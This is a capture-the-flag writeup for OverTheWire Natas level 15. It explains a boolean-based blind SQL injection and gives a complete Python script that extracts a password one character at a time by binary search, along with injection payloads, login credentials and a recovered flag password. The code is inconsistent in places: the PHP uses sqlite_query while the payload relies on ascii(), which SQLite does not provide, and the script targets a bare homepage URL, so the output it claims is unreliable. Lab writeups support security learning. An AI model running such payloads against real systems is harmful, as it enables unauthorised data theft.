# OverTheWire: Natas Level 15 -> Level 16 Writeup

## 1. Challenge Background & Analysis
The objective of this level is to retrieve the password for Natas Level 16. The application features a user lookup interface. Unlike previous levels, the database execution results or detailed errors are completely hidden from the user interface. 

By analyzing the underlying logic, we observe that the application only returns two distinct environmental states based on the query outcome:

```php
$query = "SELECT * from users where username='".$_REQUEST["username"]."'";
$res = sqlite_query($database, $query); 
if(sqlite_num_rows($res) > 0) {
    echo "This user exists.<br>";
} else {
    echo "This user doesn't exist.<br>";
}
```

Because the input is directly concatenated using single quotes (`'`) and lacks parameterization, it is highly vulnerable to SQL Injection. However, since no data is direct-rendered, we must perform a **Boolean-based Blind SQL Injection** to exfiltrate the target password byte by byte.

## 2. Solution Strategy & Exploitation

### Probe & Verification:
To confirm the blind injection vector, we submit two logical inputs to the `username` field:
* **Input A**: `natas16' and 1=1-- ` -> Server responds: `This user exists.` (Evaluates to True)
* **Input B**: `natas16' and 1=2-- ` -> Server responds: `This user doesn't exist.` (Evaluates to False)

This conditional reflection behavior confirms that we can ask the database conditional questions to extract sensitive information.

### Optimization via Binary Search:
Instead of iterating through the entire alphanumeric character set sequentially (which requires up to 62 requests per character), we can leverage a **Binary Search algorithm** over the ASCII range to locate each character in \(\log_2(N)\) steps (approximately 6-7 requests per character).

### Python Automation Script:
We construct a payload leveraging the `ascii()` and `substring()` functions to perform the binary range evaluation via an automated script:

```python
import requests
from requests.auth import HTTPBasicAuth

url = "http://overthewire.org"
auth = HTTPBasicAuth('natas15', 'GB6USCJYJjwLyYhZUNkE1NwDueiTow6g')
password = ""

print("[+] Launching Boolean-based Blind SQLi with Binary Search...")

for position in range(1, 33): # Passwords are typically 32 chars
    low = 32   # Lower bound of printable ASCII
    high = 126 # Upper bound of printable ASCII
    
    while low <= high:
        mid = (low + high) // 2
        # Construct the conditional payload with single-quote break out
        payload = f"natas16' and ascii(substring(password, {position}, 1)) >= {mid}-- "
        
        try:
            response = requests.post(url, auth=auth, data={'username': payload})
            
            if "This user exists." in response.text:
                # True: Target character is in the upper half range
                low = mid + 1
            else:
                # False: Target character is in the lower half range
                high = mid - 1
        except requests.RequestException as e:
            print(f"\n[!] Network error occurred: {e}")
            continue
            
    # The true character converges at 'high' or 'low - 1' after loop termination
    password += chr(high)
    print(f"[+] Recovered prefix: {password}")

print(f"\n[+] Success! The password for natas16 is: {password}")
```

### Result Analysis:
```text
Success! The password for natas16 is: Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb
```

## 3. Flag / Final Result
* **Natas Level 16 Password**: `Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb`
